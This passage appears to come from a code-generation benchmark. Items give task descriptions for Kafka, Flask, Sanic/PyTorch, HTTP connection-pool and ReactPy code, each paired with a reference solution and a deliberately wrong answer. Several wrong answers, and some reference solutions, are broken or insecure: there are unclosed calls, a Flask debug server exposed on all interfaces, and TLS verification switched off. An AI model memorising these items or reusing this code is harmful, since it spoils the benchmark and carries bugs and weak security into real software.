    "wrong_result": "import asyncio\nfrom confluent_kafka import Consumer, KafkaError\n\nasync def async_process_streaming_output(\n    input_done: asyncio.Event,\n    output_topic_name: str,\n    result_handler: callable,\n    batch_size: int,\n    kafka_bootstrap_servers: str,\n    kafka_output_consumer_timeout_ms: int\n):\n    consumer_config = {\n        'bootstrap.servers': kafka_bootstrap_servers,\n        'group.id': 'streaming-consumer-group',\n        'auto.offset.reset': 'earliest',\n        'enable.auto.commit': False,\n        'message.timeout.ms': kafka_output_consumer_timeout_ms\n    }\n\n    while True:\n        try:\n            consumer = Consumer(consumer_config)\n            consumer.subscribe([output_topic_name])\n\n            while not input_done.is_set():\n                try:\n                    messages = []\n                    while len(messages) < batch_size and not input_done.is_set():\n                        msg = consumer.poll(timeout=1.0)\n                        if msg is None:\n                            continue\n                        if msg.error():\n                            print(f'Consumer error: {msg.error()}')\n                            break\n                        messages.append(msg.value())\n\n                    if messages:\n                        result_handler(messages)\n                        consumer.commit()\n                except Exception as e:\n                    print(f'Error processing messages: {e}')\n                    await asyncio.sleep(1)\n\n            consumer.close()\n            break\n        except Exception as e:\n            print(f'Error initializing consumer: {e}')\n            await asyncio.sleep(5)"
  },
  {
    "Task_id": 200,
    "Instruction": "Task Description: Create a Flask-based HTTP server with multiple endpoints that return different responses, including a main API endpoint, a root endpoint, and a static file endpoint that will be overridden by Nginx.\n\nFunction Description: The code creates a Flask application with three routes:\n1. An API endpoint (\"/api\") that returns a greeting message with Python version information\n2. A root endpoint (\"/\") that returns a basic message\n3. A static file endpoint (\"/content/test.txt\") that returns a message which will be overridden by Nginx\n\nInput: None (Flask automatically handles incoming HTTP requests)\n\nOutput: \n- For \"/api\" endpoint: A string containing a greeting message with Python version\n- For \"/\" endpoint: A string \"API response overriden by Nginx\"\n- For \"/content/test.txt\" endpoint: A string \"Not run, Nginx overrides to serve static file\"",
    "Canonical_solution": "from flask import Flask\ncustom_app = Flask(__name__)\n\n@custom_app.route(\"/api\")\ndef hello():\n    version = \"{}.{}\".format(sys.version_info.major, sys.version_info.minor)\n    message = \"Hello World from Flask in a uWSGI Nginx Docker container with Python {} - testing\".format(\n        version\n    )\n    return message\n\n@custom_app.route(\"/\")\ndef main():\n    return \"API response overriden by Nginx\"\n\n@custom_app.route(\"/content/test.txt\")\ndef static_test():\n    return \"Not run, Nginx overrides to serve static file\"\n\nif __name__ == \"__main__\":\n    custom_app.run(host=\"0.0.0.0\", debug=True, port=80)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask, send_file\n\napp = Flask(__name__)\n\n@app.route('/api')\ndef api_endpoint():\n    python_version = f\"Python {getattr(__import__('sys'), 'version')}\"\n    return f\"Hello from API, Python version: {python_version}\"\n\n@app.route('/')\ndef root_endpoint():\n    return \"API response overriden by Nginx\"\n\n@app.route('/content/test.txt')\ndef static_file_endpoint():\n    return \"Not run, Nginx overrides to serve static file\"\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 208,
    "Instruction": "Task Description: Create a Python class that manages a queue-based system for processing image style transfer requests using a pre-trained PyTorch model, with asynchronous batch processing capabilities.\n\nClass Description: ModelRunner is a class that handles asynchronous processing of image style transfer requests using a PyTorch model. It manages a queue system with configurable batch processing, queue limits, and wait times to efficiently process incoming requests.\n\nAttributes:\n- model_name: str - Path to the pre-trained PyTorch model file\n- queue: list - Stores pending processing tasks\n- queue_lock: asyncio.Lock - Synchronization lock for queue access\n- model: torch.jit.ScriptModule - Loaded PyTorch model\n- needs_processing: asyncio.Event - Signals when processing is needed\n- needs_processing_timer: asyncio.TimerHandle - Timer for delayed processing\n\nMethods:\n- __init__(model_name: str) -> None - Initializes the model runner with the specified model file\n- schedule_processing_if_needed() -> None - Checks queue and triggers processing if conditions are met\n- process_input(input: torch.Tensor) -> torch.Tensor - Adds input to queue and waits for processed output\n- run_model(batch: torch.Tensor) -> torch.Tensor - Executes the model on the input batch (synchronous)\n- model_runner() -> None - Main processing loop that handles batch processing asynchronously",
    "Canonical_solution": "import sys\nimport asyncio\nimport functools\nfrom sanic import Sanic\nfrom sanic.response import raw, text\nfrom sanic.log import logger\nimport sanic\nimport torch\nimport torchvision\nimport PIL.Image\nimport io\n\nclass ModelRunner:\n    def __init__(self, model_name):\n        self.model_name = model_name\n        self.queue = []\n        self.queue_lock = None\n        self.model = torch.jit.load(self.model_name, map_location=torch.device('cpu'))\n        self.needs_processing = None\n        self.needs_processing_timer = None\n\n    def schedule_processing_if_needed(self):\n        if len(self.queue) >= 2:  # MAX_BATCH_SIZE\n            logger.debug(\"next batch ready when processing a batch\")\n            self.needs_processing.set()\n        elif self.queue:\n            logger.debug(\"queue nonempty when processing a batch, setting next timer\")\n            self.needs_processing_timer = app.loop.call_at(self.queue[0][\"time\"] + 1, self.needs_processing.set)  # MAX_WAIT\n\n    async def process_input(self, input):\n        our_task = {\"done_event\": asyncio.Event(loop=app.loop),\n                    \"input\": input,\n                    \"time\": app.loop.time()}\n        async with self.queue_lock:\n            if len(self.queue) >= 3:  # MAX_QUEUE_SIZE\n                raise HandlingError(\"I'm too busy\", code=503)\n            self.queue.append(our_task)\n            logger.debug(\"enqueued task. new queue size {}\".format(len(self.queue)))\n            self.schedule_processing_if_needed()\n        await our_task[\"done_event\"].wait()\n        return our_task[\"output\"]\n\n    def run_model(self, batch):\n        return self.model(batch.to(torch.device('cpu'))).to('cpu')\n\n    async def model_runner(self):\n        self.queue_lock = asyncio.Lock(loop=app.loop)\n        self.needs_processing = asyncio.Event(loop=app.loop)\n        logger.info(\"started model runner for {}\".format(self.model_name))\n        while True:\n            await self.needs_processing.wait()\n            self.needs_processing.clear()\n            if self.needs_processing_timer is not None:\n                self.needs_processing_timer.cancel()\n                self.needs_processing_timer = None\n            async with self.queue_lock:\n                if self.queue:\n                    longest_wait = app.loop.time() - self.queue[0][\"time\"]\n                else:\n                    longest_wait = None\n                logger.debug(\"launching processing. queue size: {}. longest wait: {}\".format(len(self.queue), longest_wait))\n                to_process = self.queue[:2]  # MAX_BATCH_SIZE\n                del self.queue[:len(to_process)]\n                self.schedule_processing_if_needed()\n            batch = torch.stack([t[\"input\"] for t in to_process], dim=0)\n            result = await app.loop.run_in_executor(\n                None, functools.partial(self.run_model, batch)\n            for t, r in zip(to_process, result):\n                t[\"output\"] = r\n                t[\"done_event\"].set()\n            del to_process\n\nclass HandlingError(Exception):\n    def __init__(self, msg, code=500):\n        super().__init__()\n        self.handling_code = code\n        self.handling_msg = msg\n\napp = Sanic(__name__)\n\n@app.route('/image', methods=['PUT'], stream=True)\nasync def image(request):\n    try:\n        content_length = int(request.headers.get('content-length', '0'))\n        MAX_SIZE = 2**22\n        if content_length:\n            if content_length > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n            data = bytearray(content_length)\n        else:\n            data = bytearray(MAX_SIZE)\n        pos = 0\n        while True:\n            data_part = await request.stream.read()\n            if data_part is None:\n                break\n            data[pos: len(data_part) + pos] = data_part\n            pos += len(data_part)\n            if pos > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n\n        im = PIL.Image.open(io.BytesIO(data))\n        im = torchvision.transforms.functional.resize(im, (228, 228))\n        im = torchvision.transforms.functional.to_tensor(im)\n        im = im[:3]\n        if im.dim() != 3 or im.size(0) < 3 or im.size(0) > 4:\n            raise HandlingError(\"need rgb image\")\n        out_im = await style_transfer_runner.process_input(im)\n        out_im = torchvision.transforms.functional.to_pil_image(out_im)\n        imgByteArr = io.BytesIO()\n        out_im.save(imgByteArr, format='JPEG')\n        return raw(imgByteArr.getvalue(), status=200, content_type='image/jpeg')\n    except HandlingError as e:\n        return text(e.handling_msg, status=e.handling_code)\n\nstyle_transfer_runner = ModelRunner(sys.argv[1])\napp.add_task(style_transfer_runner.model_runner())",
    "Code_level": "Class-level",
    "FSMID_for_test": 62,
    "wrong_result": "import asyncio\nimport torch\nfrom torch.jit import ScriptModule\nimport os\n\nclass ModelRunner:\n    def __init__(self, model_name: str) -> None:\n        self.model_name = model_name\n        self.queue = []\n        self.queue_lock = asyncio.Lock()\n        self.model = self._load_model(model_name)\n        self.needs_processing = asyncio.Event()\n        self.needs_processing_timer = None\n\n    def _load_model(self, model_name: str) -> ScriptModule:\n        model_path = os.path.join(os.path.dirname(__file__), model_name)\n        return torch.jit.load(model_path)\n\n    async def schedule_processing_if_needed(self) -> None:\n        async with self.queue_lock:\n            if self.queue:\n                self.needs_processing.set()\n\n    async def process_input(self, input: torch.Tensor) -> torch.Tensor:\n        async with self.queue_lock:\n            self.queue.append(input)\n            await self.schedule_processing_if_needed()\n            await self.needs_processing.wait()\n\n    def run_model(self, batch: torch.Tensor) -> torch.Tensor:\n        return self.model(batch)\n\n    async def model_runner(self) -> None:\n        while True:\n            async with self.queue_lock:\n                if not self.queue:\n                    await self.needs_processing.wait()\n                if self.queue:\n                    batch = torch.stack(self.queue)\n                    result = self.run_model(batch)\n                    self.queue.clear()\n                    for item in self.queue:\n                        self.queue.remove(item)\n                    await self.schedule_processing_if_needed()\n            await asyncio.sleep(0.1)"
  },
  {
    "Task_id": 209,
    "Instruction": "Task Description: Implement an asynchronous HTTP server using Sanic framework that processes image style transfer requests, with batching and queue management for efficient model inference.\n\nClass Description: ModelRunner is a class that manages a queue of image processing tasks, batches them efficiently, and runs them through a pretrained PyTorch model for style transfer.\n\nAttributes:\n- model_name: str - Name of the pretrained model to use\n- queue: list - List of pending image processing tasks\n- queue_lock: asyncio.Lock - Lock for thread-safe queue operations\n- model: torch.nn.Module - Loaded pretrained model\n- needs_processing: asyncio.Event - Event signaling when processing is needed\n- needs_processing_timer: asyncio.TimerHandle - Timer for delayed processing\n\nMethods:\n- __init__(model_name: str) -> None - Initializes the model runner with specified model name\n- schedule_processing_if_needed() -> None - Checks queue and triggers processing if conditions are met\n- process_input(input: torch.Tensor) -> torch.Tensor - Adds input to queue and waits for processed output\n- run_model(batch: torch.Tensor) -> torch.Tensor - Runs the model on a batch of inputs (synchronous)\n- model_runner() -> None - Main processing loop that handles batching and model execution\n\nFunction Description: The image endpoint handles HTTP PUT requests containing image data, processes them through the style transfer model, and returns the transformed image.\n\nInput:\n- request: sanic.Request - HTTP request object containing image data in the body\n\nOutput:\n- sanic.response.raw - Processed image in JPEG format, or error message if processing fails",
    "Canonical_solution": "import sys\nimport asyncio\nimport functools\nfrom sanic import Sanic\nfrom sanic.response import raw\nfrom sanic.log import logger\nimport sanic\nimport torch\nimport torchvision\nimport PIL.Image\nimport io\n\nclass ModelRunner:\n    def __init__(self, model_name):\n        self.model_name = model_name\n        self.queue = []\n        self.queue_lock = None\n        self.model = get_pretrained_model(self.model_name, map_location=torch.device('cpu'))\n        self.needs_processing = None\n        self.needs_processing_timer = None\n\n    def schedule_processing_if_needed(self):\n        if len(self.queue) >= 2:  # MAX_BATCH_SIZE\n            logger.debug(\"next batch ready when processing a batch\")\n            self.needs_processing.set()\n        elif self.queue:\n            logger.debug(\"queue nonempty when processing a batch, setting next timer\")\n            self.needs_processing_timer = app.loop.call_at(self.queue[0][\"time\"] + 1, self.needs_processing.set)  # MAX_WAIT\n\n    async def process_input(self, input):\n        our_task = {\n            \"done_event\": asyncio.Event(loop=app.loop),\n            \"input\": input,\n            \"time\": app.loop.time()\n        }\n        async with self.queue_lock:\n            if len(self.queue) >= 3:  # MAX_QUEUE_SIZE\n                raise HandlingError(\"I'm too busy\", code=503)\n            self.queue.append(our_task)\n            logger.debug(\"enqueued task. new queue size {}\".format(len(self.queue)))\n            self.schedule_processing_if_needed()\n\n        await our_task[\"done_event\"].wait()\n        return our_task[\"output\"]\n\n    def run_model(self, batch):\n        return self.model(batch.to(torch.device('cpu'))).to('cpu')\n\n    async def model_runner(self):\n        self.queue_lock = asyncio.Lock(loop=app.loop)\n        self.needs_processing = asyncio.Event(loop=app.loop)\n        logger.info(\"started model runner for {}\".format(self.model_name))\n        while True:\n            await self.needs_processing.wait()\n            self.needs_processing.clear()\n            if self.needs_processing_timer is not None:\n                self.needs_processing_timer.cancel()\n                self.needs_processing_timer = None\n            async with self.queue_lock:\n                if self.queue:\n                    longest_wait = app.loop.time() - self.queue[0][\"time\"]\n                else:\n                    longest_wait = None\n                logger.debug(\"launching processing. queue size: {}. longest wait: {}\".format(len(self.queue), longest_wait))\n                to_process = self.queue[:2]  # MAX_BATCH_SIZE\n                del self.queue[:len(to_process)]\n                self.schedule_processing_if_needed()\n            batch = torch.stack([t[\"input\"] for t in to_process], dim=0)\n            result = await app.loop.run_in_executor(\n                None, functools.partial(self.run_model, batch)\n            for t, r in zip(to_process, result):\n                t[\"output\"] = r\n                t[\"done_event\"].set()\n            del to_process\n\nclass HandlingError(Exception):\n    def __init__(self, msg, code=500):\n        super().__init__()\n        self.handling_code = code\n        self.handling_msg = msg\n\napp = Sanic(__name__)\n\n@app.route('/image', methods=['PUT'], stream=True)\nasync def image(request):\n    try:\n        content_length = int(request.headers.get('content-length', '0'))\n        MAX_SIZE = 2**22\n        if content_length:\n            if content_length > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n            data = bytearray(content_length)\n        else:\n            data = bytearray(MAX_SIZE)\n        pos = 0\n        while True:\n            data_part = await request.stream.read()\n            if data_part is None:\n                break\n            data[pos: len(data_part) + pos] = data_part\n            pos += len(data_part)\n            if pos > MAX_SIZE:\n                raise HandlingError(\"Too large\")\n\n        im = PIL.Image.open(io.BytesIO(data))\n        im = torchvision.transforms.functional.resize(im, (228, 228))\n        im = torchvision.transforms.functional.to_tensor(im)\n        im = im[:3]\n        if im.dim() != 3 or im.size(0) < 3 or im.size(0) > 4:\n            raise HandlingError(\"need rgb image\")\n        out_im = await style_transfer_runner.process_input(im)\n        out_im = torchvision.transforms.functional.to_pil_image(out_im)\n        imgByteArr = io.BytesIO()\n        out_im.save(imgByteArr, format='JPEG')\n        return raw(imgByteArr.getvalue(), status=200, content_type='image/jpeg')\n    except HandlingError as e:\n        return sanic.response.text(e.handling_msg, status=e.handling_code)",
    "Code_level": "Class-level",
    "FSMID_for_test": 62,
    "wrong_result": "import sanic\nimport asyncio\nimport torch\nfrom PIL import Image\nfrom io import BytesIO\nimport base64\nimport numpy as np\n\nclass ModelRunner:\n    def __init__(self, model_name: str):\n        self.model_name = model_name\n        self.queue = []\n        self.queue_lock = asyncio.Lock()\n        self.model = self._load_model(model_name)\n        self.needs_processing = asyncio.Event()\n        self.needs_processing_timer = None\n\n    def _load_model(self, model_name: str) -> torch.nn.Module:\n        # Placeholder for model loading logic\n        # In a real scenario, this would load a pretrained PyTorch model\n        return torch.nn.Identity()\n\n    async def schedule_processing_if_needed(self):\n        await self.needs_processing.wait()\n        self.needs_processing.clear()\n        if self.queue:\n            await self.process_batch()\n\n    async def process_batch(self):\n        batch = []\n        while self.queue and len(batch) < 8:  # Process up to 8 images at a time\n            batch.append(self.queue.pop(0))\n        if batch:\n            result = await self.run_model(torch.stack(batch))\n            for i, task in enumerate(batch):\n                task['result'] = result[i]\n                task['done'].set_result(None)\n\n    async def process_input(self, input: torch.Tensor) -> torch.Tensor:\n        async with self.queue_lock:\n            self.queue.append({'input': input, 'done': asyncio.Future()})\n        await self.schedule_processing_if_needed()\n        await self._wait_for_completion()\n\n    async def _wait_for_completion(self):\n        await self.needs_processing.wait()\n        self.needs_processing.clear()\n\n    def run_model(self, batch: torch.Tensor) -> torch.Tensor:\n        # Placeholder for model inference logic\n        # In a real scenario, this would run the model on the batch\n        return batch\n\nasync def model_runner():\n    runner = ModelRunner(\"style_transfer_model\")\n    while True:\n        await asyncio.sleep(1)\n        await runner.schedule_processing_if_needed()\n\n@app.route('/style-transfer', methods=['PUT'])\nasync def style_transfer(request):\n    try:\n        data = request.files.get('image')\n        if not data:\n            return sanic.response.raw(b'{\"error\": \"No image data provided\"}', status=400)\n        \n        # Convert image data to tensor\n        image = Image.open(BytesIO(data.stream.read()))\n        image = image.convert(\"RGB\")\n        image = image.resize((256, 256))\n        image = np.array(image).astype(np.float32) / 255.0\n        image = torch.from_numpy(image).permute(2, 0, 1).unsqueeze(0)\n        \n        # Process image through the model\n        result = await runner.process_input(image)\n        \n        # Convert result back to image\n        result = result.permute(1, 2, 0).numpy()\n        result = (result * 255).astype(np.uint8)\n        result = Image.fromarray(result).convert(\"JPEG\")\n        output_buffer = BytesIO()\n        result.save(output_buffer, format=\"JPEG\")\n        output_data = output_buffer.getvalue()\n        \n        return sanic.response.raw(output_data, headers={\"Content-Type\": \"image/jpeg\"})\n    \n    except Exception as e:\n        return sanic.response.raw(f'{{\"error\": \"{str(e)}\"}}'.encode(), status=500)\n\nif __name__ == '__main__':\n    runner = ModelRunner(\"style_transfer_model\")\n    loop = asyncio.new_event_loop()\n    asyncio.set_event_loop(loop)\n    loop.create_task(model_runner())\n    app.run(host='0.0.0.0', port=8000)"
  },
  {
    "Task_id": 21,
    "Instruction": "Task Description: Implement a connection pooling system for HTTP and HTTPS connections to efficiently manage and reuse connections to a target server.\n\nClass Description: HTTPConnectionPool is a connection pool implementation that manages HTTP connections to a specific host and port. It provides methods to get, put, and make requests using connections from the pool.\n\nAttributes:\n- scheme: str - The URL scheme (http or https)\n- host: str - The target host for connections\n- port: int - The target port for connections\n- timeout: Timeout - Connection and read timeout settings\n- retries: Retry - Retry configuration for failed requests\n- pool: LifoQueue - The connection pool storage (LIFO queue)\n- block: bool - Whether to block when pool is empty\n- proxy: str - Proxy server URL (optional)\n- proxy_headers: dict - Headers for proxy requests\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None - Initializes the connection pool with configuration parameters\n- _new_conn() -> HTTPConnection - Creates a new connection instance\n- _get_conn(timeout=None) -> HTTPConnection - Gets a connection from the pool or creates a new one\n- _put_conn(conn) -> None - Returns a connection to the pool\n- _make_request(conn, method, url, timeout=_Default, **httplib_request_kw) -> HTTPResponse - Makes an HTTP request using the specified connection\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, **response_kw) -> HTTPResponse - Main method to make HTTP requests with connection pooling and retry logic\n- close() -> None - Closes all connections in the pool\n\nClass Description: HTTPSConnectionPool extends HTTPConnectionPool to handle HTTPS connections with SSL/TLS configuration.\n\nAttributes:\n- key_file: str - Path to client private key file\n- cert_file: str - Path to client certificate file\n- cert_reqs: str - Certificate requirements\n- ca_certs: str - Path to CA certificates file\n- ssl_version: str - SSL version to use\n- assert_hostname: str - Hostname to verify against certificate\n- assert_fingerprint: str - Expected certificate fingerprint\n\nMethods:\n- _prepare_conn(conn) -> HTTPSConnection - Configures SSL/TLS settings on a connection\n- _new_conn() -> HTTPSConnection - Creates a new HTTPS connection with SSL/TLS configuration",
    "Canonical_solution": "import socket\nimport errno\nfrom socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .util.timeout import Timeout\nfrom .util.retry import Retry\nfrom .util.url import parse_url\nfrom .exceptions import (\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProtocolError,\n    ProxyError,\n    SSLError,\n    TimeoutError,\n    ClosedPoolError,\n    NewConnectionError\n)\nfrom .packages import six\nfrom .packages.six.moves import queue\nfrom .util.queue import LifoQueue\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        strict=False,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.pool = LifoQueue(maxsize)\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            strict=self.strict,\n            **self.conn_kw\n        )\n\n    def _get_conn(self, timeout=None):\n        try:\n            conn = self.pool.get(block=self.block, timeout=timeout)\n            if conn and is_connection_dropped(conn):\n                conn.close()\n                conn = None\n            return conn or self._new_conn()\n        except queue.Empty:\n            raise EmptyPoolError(self, \"Pool is empty.\")\n\n    def _put_conn(self, conn):\n        try:\n            self.pool.put(conn, block=False)\n        except queue.Full:\n            conn.close()\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        timeout_obj = self._get_timeout(timeout)\n        conn.timeout = timeout_obj.connect_timeout\n        conn.request(method, url, **httplib_request_kw)\n        return conn.getresponse()\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        release_conn=None,\n        **response_kw\n    ):\n        if retries is None:\n            retries = self.retries\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries)\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers\n            )\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=conn,\n                retries=retries,\n                **response_kw\n            )\n            return response\n        except (SocketError, ProtocolError) as e:\n            retries = retries.increment(method, url, error=e, _pool=self)\n            retries.sleep()\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                redirect,\n                assert_same_host,\n                timeout,\n                pool_timeout,\n                release_conn,\n                **response_kw\n            )\n\n    def close(self):\n        while True:\n            try:\n                conn = self.pool.get(block=False)\n                conn.close()\n            except queue.Empty:\n                break\n\nclass HTTPSConnectionPool(HTTPConnectionPool):\n    scheme = \"https\"\n    ConnectionCls = HTTPSConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        strict=False,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        key_file=None,\n        cert_file=None,\n        cert_reqs=None,\n        ca_certs=None,\n        ssl_version=None,\n        assert_hostname=None,\n        assert_fingerprint=None,\n        **conn_kw\n    ):\n        super(HTTPSConnectionPool, self).__init__(\n            host,\n            port,\n            strict,\n            timeout,\n            maxsize,\n            block,\n            headers,\n            retries,\n            _proxy,\n            _proxy_headers,\n            **conn_kw\n        )\n        self.key_file = key_file\n        self.cert_file = cert_file\n        self.cert_reqs = cert_reqs\n        self.ca_certs = ca_certs\n        self.ssl_version = ssl_version\n        self.assert_hostname = assert_hostname\n        self.assert_fingerprint = assert_fingerprint\n\n    def _prepare_conn(self, conn):\n        conn.set_cert(\n            key_file=self.key_file,\n            cert_file=self.cert_file,\n            cert_reqs=self.cert_reqs,\n            ca_certs=self.ca_certs,\n            assert_hostname=self.assert_hostname,\n            assert_fingerprint=self.assert_fingerprint\n        )\n        conn.ssl_version = self.ssl_version\n        return conn\n\n    def _new_conn(self):\n        conn = super(HTTPSConnectionPool, self)._new_conn()\n        return self._prepare_conn(conn)",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import urllib.request\nfrom urllib.error import URLError, HTTPError\nfrom urllib.request import HTTPConnection, HTTPSConnection\nfrom urllib.parse import urlparse\nfrom urllib.request import Request\nimport ssl\nimport socket\nfrom collections import deque\nimport time\n\nclass HTTPConnectionPool:\n    def __init__(self, host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        self.scheme = 'http'\n        self.host = host\n        self.port = port or 80\n        self.timeout = timeout\n        self.retries = retries\n        self.pool = deque()\n        self.block = block\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers\n        self.headers = headers\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        return HTTPConnection(self.host, self.port)\n\n    def _get_conn(self, timeout=None):\n        if not self.block:\n            while True:\n                if self.pool:\n                    return self.pool.popleft()\n                else:\n                    return self._new_conn()\n        else:\n            if self.pool:\n                return self.pool.popleft()\n            else:\n                return self._new_conn()\n\n    def _put_conn(self, conn):\n        self.pool.append(conn)\n\n    def _make_request(self, conn, method, url, timeout=_Default, **httplib_request_kw):\n        return conn.request(method, url, **httplib_request_kw)\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, **response_kw):\n        if not retries:\n            retries = self.retries\n        if not headers:\n            headers = self.headers\n        if not timeout:\n            timeout = self.timeout\n        if not pool_timeout:\n            pool_timeout = self.timeout\n        if not release_conn:\n            release_conn = True\n        if not redirect:\n            redirect = False\n        if not assert_same_host:\n            assert_same_host = True\n        if not response_kw:\n            response_kw = {}\n        if not method:\n            method = 'GET'\n        if not url:\n            url = ''\n        if not body:\n            body = ''\n        if not headers:\n            headers = {}\n        if not retries:\n            retries = self.retries\n        if not timeout:\n            timeout = self.timeout\n        if not pool_timeout:\n            pool_timeout = self.timeout\n        if not release_conn:\n            release_conn = True\n        if not redirect:\n            redirect = False\n        if not assert_same_host:\n            assert_same_host = True\n        if not response_kw:\n            response_kw = {}\n        if not method:\n            method = 'GET'\n        if not url:\n            url = ''\n        if not body:\n            body = ''\n        if not headers:\n            headers = {}\n        if not retries:\n            retries = self.retries\n        if not timeout:\n            timeout = self.timeout\n        if not pool_timeout:\n            pool_timeout = self.timeout\n        if not release_conn:\n            release_conn = True\n        if not redirect:\n            redirect = False\n        if not assert_same_host:\n            assert_same_host = True\n        if not response_kw:\n            response_kw = {}\n\nclass HTTPSConnectionPool(HTTPConnectionPool):\n    def __init__(self, host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        super().__init__(host, port, strict, timeout, maxsize, block, headers, retries, _proxy, _proxy_headers, **conn_kw)\n        self.key_file = conn_kw.get('key_file')\n        self.cert_file = conn_kw.get('cert_file')\n        self.cert_reqs = conn_kw.get('cert_reqs', 'CERT_REQUIRED')\n        self.ca_certs = conn_kw.get('ca_certs')\n        self.ssl_version = conn_kw.get('ssl_version', ssl.PROTOCOL_TLSv1_2)\n        self.assert_hostname = conn_kw.get('assert_hostname', True)\n        self.assert_fingerprint = conn_kw.get('assert_fingerprint', None)\n\n    def _prepare_conn(self, conn):\n        if self.key_file and self.cert_file:\n            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)\n            context.load_cert_chain(self.cert_file, keyfile=self.key_file)\n            context.verify_mode = ssl.CERT_REQUIRED\n            context.check_hostname = self.assert_hostname\n            if self.assert_fingerprint:\n                context.verify_mode = ssl.CERT_NONE\n            conn.sock = context.wrap_socket(conn.sock, server_hostname=self.assert_hostname)\n        else:\n            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)\n            context.verify_mode = ssl.CERT_REQUIRED\n            context.check_hostname = self.assert_hostname\n            if self.assert_fingerprint:\n                context.verify_mode = ssl.CERT_NONE\n            conn.sock = context.wrap_socket(conn.sock, server_hostname=self.assert_hostname)\n        return conn\n\n    def _new_conn(self):\n        return HTTPSConnection(self.host, self.port)"
  },
  {
    "Task_id": 215,
    "Instruction": "Task Description: Create a Sanic web application that serves as a backend for a ReactPy application, including a root route redirection and ReactPy configuration.\n\nFunction Description: The function `make_app` creates and configures a Sanic web application instance. It sets up a root route that redirects to a documentation page and configures the ReactPy backend with a specified URL prefix.\n\nInput:\n- name: str - The name to give the Sanic application instance\n\nOutput:\n- Sanic - Returns a configured Sanic application instance with:\n  - A root route (\"/\") that redirects to \"/docs/index.html\"\n  - ReactPy backend configured with the specified URL prefix (\"/_reactpy\")",
    "Canonical_solution": "from sanic import Sanic, response\nfrom reactpy.backend.sanic import Options, configure\n\nREACTPY_MODEL_SERVER_URL_PREFIX = \"/_reactpy\"\n\ndef make_app(name: str):\n    app = Sanic(name)\n\n    @app.route(\"/\")\n    async def forward_to_index(_):\n        return response.redirect(\"/docs/index.html\")\n\n    configure(\n        app,\n        Example,\n        Options(url_prefix=REACTPY_MODEL_SERVER_URL_PREFIX),\n    )\n\n    return app",
    "Code_level": "Function-level",
    "FSMID_for_test": 62,
    "wrong_result": "from sanic import Sanic\nfrom sanic.response import redirect\nfrom reactpy.backend.sanic import configure_reactpy\n\ndef make_app(name):\n    app = Sanic(name)\n    app.route(\"/\")(lambda request: redirect(\"/docs/index.html\"))\n    configure_reactpy(app, url_prefix=\"/_reactpy\")\n    return app"
  },
  {
    "Task_id": 217,
    "Instruction": "Task Description: Create a Python HTTP server for testing purposes that can handle GET and POST requests, serve static and dynamic files, and support features like range requests and gzip compression.\n\nClass Description: HTTPTestHandler is a custom request handler class that extends BaseHTTPRequestHandler to implement specific HTTP request handling logic for testing scenarios.\n\nAttributes:\n- static_files: dict - A dictionary mapping file paths to their static content (bytes)\n- dynamic_files: dict - A dictionary for storing dynamically created file content (bytes)\n- files: ChainMap - A combined view of both static_files and dynamic_files dictionaries\n\nMethods:\n- _respond(code=200, headers=None, data=b\"\"): None - Helper method to send HTTP responses\n  Input:\n    - code: int - HTTP status code (default: 200)\n    - headers: dict - Response headers (default: None)\n    - data: bytes - Response body (default: empty bytes)\n  Output: None (sends response directly to client)\n\n- do_GET(): None - Handles HTTP GET requests\n  Input: None (uses self.path and self.headers from the request)\n  Output: None (sends response directly to client)\n\n- do_POST(): None - Handles HTTP POST requests\n  Input: None (uses 